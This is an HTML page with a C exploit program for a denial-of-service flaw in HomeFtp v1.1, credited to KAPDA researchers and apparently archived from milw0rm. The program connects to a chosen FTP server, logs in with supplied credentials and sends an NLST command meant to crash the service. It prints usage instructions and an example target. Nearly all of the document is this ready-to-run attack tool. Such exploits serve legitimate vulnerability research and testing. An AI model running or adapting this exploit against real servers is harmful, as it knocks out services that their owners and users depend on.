<html><head><title>HomeFtp 1.1 (NLST) Denial of Service Vulnerability</title></head><pre>/*
HomeFtp v1.1 Denial of Service
original advisory: http://kapda.ir/advisory-202.html
homeftp_v1.1_xpl.c
----------------------------------------
*/

#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define  POCSTR &quot;USER %s\x0d\x0aPASS %s\x0d\x0aNLST\x0d\x0a&quot;

int header();
int usage(char *filename);
int remote_connect( char* ip, unsigned short port );

int header() {
printf(&quot;\n[i] KAPDA - Computer Security Science Researchers Institute\n\n&quot;);
printf(&quot;[i] Title:              \tHomeFTP &lt;= v1.1 Dos Exploit\n&quot;);
printf(&quot;[i] Discovered by:      \tcvh {a] kapda.ir\n&quot;);
printf(&quot;[i] Exploit by:         \tPi3cH {a] kapda.ir\n&quot;);
printf(&quot;[i] More info:          \twww.kapda.ir/page-advisory.html\n\n&quot;);
return 0;
}

int usage(char *filename) {
printf(&quot;[i] Usage:   \t%s HOST PORT USERNAME PASSWORD\n&quot;,filename);
printf(&quot;[i] Example: \t%s 127.0.0.1 21 anonymous none\n\n&quot;,filename);
exit(0);
}

int remote_connect( char* ip, unsigned short port )
{
int s;
struct sockaddr_in remote_addr;
struct hostent* host_addr;

memset ( &amp;remote_addr, 0x0, sizeof ( remote_addr ) );
if ( ( host_addr = gethostbyname ( ip ) ) == NULL )
{
printf ( &quot;[e] Cannot resolve \&quot;%s\&quot;\n&quot;, ip );
exit ( 1 );
}
remote_addr.sin_family = AF_INET;
remote_addr.sin_port = htons ( port );
remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr-&gt;h_addr );
if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) &lt; 0 )
{
printf ( &quot;[e] Socket failed!\n&quot; );
exit(1);
}
if ( connect ( s, ( struct sockaddr * ) &amp;remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
{
printf ( &quot;[e] Failed connecting!\n&quot; );
       exit(1);
}
return ( s );
}


int main(int argc, char *argv[]) {
 int s;
 char *request;
 header();
 if( (argc &lt; 5) )
     usage(argv[0]);
 request = (char *) malloc(1024);
 printf(&quot;[r] Connecting to remote host\n&quot;);
 s = remote_connect(argv[1],atoi(argv[2]));
 sleep(1);
 printf(&quot;[r] Creating buffer\n&quot;);
 sprintf(request,POCSTR,argv[3],argv[4]);
 printf(&quot;[r] Sending %d bytes of DOS buffer\n&quot;,strlen(request));
 if ( send ( s, request, strlen (request), 0) &lt;= 0 )
 {
         printf(&quot;[e] Failed to send buffer\n&quot;);
         close(s);
         exit(1);
 }
 sleep(1);
 printf(&quot;[s] Exploit Done!\n&quot;);
 close(s);
 free(request);
 request = NULL;
 return 0;
}

// milw0rm.com [2006-01-14]</pre></html>